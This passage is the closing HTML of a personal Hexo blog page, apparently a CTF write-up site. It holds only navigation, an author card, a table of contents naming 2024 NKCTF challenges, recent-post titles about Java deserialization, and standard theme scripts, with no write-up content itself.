+</article><div class="tag_share"><div class="post-meta__tag-list"></div><div class="post_share"><div class="social-share" data-image="/img/head.jpg" data-sites="facebook,twitter,wechat,weibo,qq"></div><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/butterfly-extsrc/sharejs/dist/css/share.min.css" media="print" onload="this.media='all'"><script src="https://cdn.jsdelivr.net/npm/butterfly-extsrc/sharejs/dist/js/social-share.min.js" defer></script></div></div><nav class="pagination-post" id="pagination"><div class="next-post pull-full"><a href="/2024/03/18/2024venomctf/" title="2024venomvtf wp+学习"><div class="cover" style="background: var(--default-bg-color)"></div><div class="pagination-info"><div class="label">Next</div><div class="next_info">2024venomvtf wp+学习</div></div></a></div></nav></div><div class="aside-content" id="aside-content"><div class="card-widget card-info"><div class="is-center"><div class="avatar-img"><img src="/img/head.jpg" onerror="this.onerror=null;this.src='/img/friend_404.gif'" alt="avatar"/></div><div class="author-info__name">AsaL1n</div><div class="author-info__description"></div></div><div class="card-info-data site-data is-center"><a href="/archives/"><div class="headline">Articles</div><div class="length-num">34</div></a><a href="/tags/"><div class="headline">Tags</div><div class="length-num">0</div></a><a href="/categories/"><div class="headline">Categories</div><div class="length-num">0</div></a></div><a id="card-info-btn" target="_blank" rel="noopener" href="https://github.com/AsaL1n"><i class="fab fa-github"></i><span>Follow Me</span></a></div><div class="card-widget card-announcement"><div class="item-headline"><i class="fas fa-bullhorn fa-shake"></i><span>Announcement</span></div><div class="announcement_content">why we need that??</div></div><div class="sticky_layout"><div class="card-widget" id="card-toc"><div class="item-headline"><i class="fas fa-stream"></i><span>Contents</span><span class="toc-percentage"></span></div><div class="toc-content"><ol class="toc"><li class="toc-item toc-level-1"><a class="toc-link" href="#2024NKCTF-WP"><span class="toc-number">1.</span> <span class="toc-text">2024NKCTF_WP</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#my-first-cms"><span class="toc-number">1.1.</span> <span class="toc-text">my first cms</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E5%85%A8%E4%B8%96%E7%95%8C%E6%9C%80%E7%AE%80%E5%8D%95%E7%9A%84CTF"><span class="toc-number">1.2.</span> <span class="toc-text">全世界最简单的CTF</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#%E5%88%86%E6%9E%90"><span class="toc-number">1.2.1.</span> <span class="toc-text">分析</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#tacooooo"><span class="toc-number">1.3.</span> <span class="toc-text">tacooooo</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E7%94%A8%E8%BF%87%E5%B0%B1%E6%98%AF%E7%86%9F%E6%82%89"><span class="toc-number">1.4.</span> <span class="toc-text">用过就是熟悉</span></a></li></ol></li></ol></div></div><div class="card-widget card-recent-post"><div class="item-headline"><i class="fas fa-history"></i><span>Recent Post</span></div><div class="aside-list"><div class="aside-list-item no-cover"><div class="content"><a class="title" href="/2024/03/26/2024NKCTF/" title="2024NKCTF">2024NKCTF</a><time datetime="2024-03-25T16:00:00.000Z" title="Created 2024-03-26 00:00:00">2024-03-26</time></div></div><div class="aside-list-item no-cover"><div class="content"><a class="title" href="/2024/03/18/2024venomctf/" title="2024venomvtf wp+学习">2024venomvtf wp+学习</a><time datetime="2024-03-17T16:00:00.000Z" title="Created 2024-03-18 00:00:00">2024-03-18</time></div></div><div class="aside-list-item no-cover"><div class="content"><a class="title" href="/2024/03/03/java%E4%BA%8C%E6%AC%A1%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/" title="JAVA二次反序列化学习">JAVA二次反序列化学习</a><time datetime="2024-03-02T16:00:00.000Z" title="Created 2024-03-03 00:00:00">2024-03-03</time></div></div><div class="aside-list-item no-cover"><div class="content"><a class="title" href="/2024/02/28/Rome%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/" title="Rome反序列化">Rome反序列化</a><time datetime="2024-02-27T16:00:00.000Z" title="Created 2024-02-28 00:00:00">2024-02-28</time></div></div><div class="aside-list-item no-cover"><div class="content"><a class="title" href="/2024/02/17/fastjson%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/" title="fastjson反序列化_学习">fastjson反序列化_学习</a><time datetime="2024-02-16T16:00:00.000Z" title="Created 2024-02-17 00:00:00">2024-02-17</time></div></div></div></div></div></div></main><footer id="footer"><div id="footer-wrap"><div class="copyright">&copy;2020 - 2024 By AsaL1n</div><div class="framework-info"><span>Framework </span><a target="_blank" rel="noopener" href="https://hexo.io">Hexo</a><span class="footer-separator">|</span><span>Theme </span><a target="_blank" rel="noopener" href="https://github.com/jerryc127/hexo-theme-butterfly">Butterfly</a></div></div></footer></div><div id="rightside"><div id="rightside-config-hide"><button id="readmode" type="button" title="Read Mode"><i class="fas fa-book-open"></i></button><button id="darkmode" type="button" title="Toggle Between Light And Dark Mode"><i class="fas fa-adjust"></i></button><button id="hide-aside-btn" type="button" title="Toggle between Single-column and Double-column"><i class="fas fa-arrows-alt-h"></i></button></div><div id="rightside-config-show"><button id="rightside-config" type="button" title="Setting"><i class="fas fa-cog fa-spin"></i></button><button class="close" id="mobile-toc-button" type="button" title="Table Of Contents"><i class="fas fa-list-ul"></i></button><button id="go-up" type="button" title="Back To Top"><span class="scroll-percent"></span><i class="fas fa-arrow-up"></i></button></div></div><div><script src="/js/utils.js"></script><script src="/js/main.js"></script><script src="https://cdn.jsdelivr.net/npm/@fancyapps/ui/dist/fancybox/fancybox.umd.min.js"></script><div class="js-pjax"></div><canvas class="fireworks" mobile="false"></canvas><script src="https://cdn.jsdelivr.net/npm/butterfly-extsrc/dist/fireworks.min.js"></script><script async data-pjax src="//busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js"></script></div></body></html>
